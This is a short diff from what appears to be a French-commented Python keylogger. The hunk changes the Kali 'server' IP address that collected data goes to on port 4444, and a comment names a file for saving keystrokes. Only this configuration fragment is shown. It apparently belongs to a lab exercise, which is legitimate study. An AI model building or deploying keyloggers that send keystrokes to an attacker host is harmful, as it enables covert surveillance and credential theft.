@@ -6,7 +6,7 @@ import socket as s  # Pour récupérer le hostname
 import os  # Pour gérer les fichiers
 
 # Adresse et port du serveur (Kali)
-SERVER_IP = "192.168.56.1"  # Remplace par l'adresse IP de ta machine Kali
+SERVER_IP = "192.168.196.1"
 SERVER_PORT = 4444
 
 # Fichier pour sauvegarder les frappes
